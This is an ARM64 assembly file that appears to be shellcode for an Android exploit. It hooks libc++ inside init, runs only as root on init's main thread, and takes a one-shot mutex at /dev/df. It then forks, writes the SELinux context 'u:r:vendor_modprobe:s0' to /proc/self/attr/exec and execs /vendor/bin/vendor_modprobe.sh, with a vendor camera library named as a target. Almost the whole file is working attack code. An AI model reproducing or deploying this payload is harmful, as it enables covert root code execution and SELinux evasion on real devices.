    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

mutex_file:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
loader_path:
    .asciz "/vendor/bin/vendor_modprobe.sh"
ko_target:
    .ascii "/vendor/lib64/camera/com.qti.sensor.imx318.so\0"
    .skip 32, 0
    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data

marker_exec:
    .asciz "/dev/dfme"

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    str x30, [sp, #-16]!

    // The libc++ hook only fires the payload from init's main thread.
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // One-shot mutex prevents repeated hook invocations from spawning workers.
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, return

    // Detach one child so init's hook path can return immediately.
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, SYS_clone
    svc     0
    cbnz    w0, return

    // The loader is a vendor_file ELF. vendor_modprobe may execute that type
    // with execute_no_trans, so the domain stays vendor_modprobe.
    mov     x0, -100
    adr     x1, attr_exec
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x8, #SYS_openat
    svc     0
    adr     x1, selinux_ctx
    mov     x2, selinux_ctx_end - selinux_ctx
    mov     x8, #SYS_write
    svc     0

    // execve(loader_path, {loader_path, NULL}, NULL)
    sub     sp, sp, 16
    adr     x1, loader_path
    str     x1, [sp]
    str     xzr, [sp, 8]
    adr     x0, loader_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0
    debug   marker_exec
    mov     x8, #34
    svc     0
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
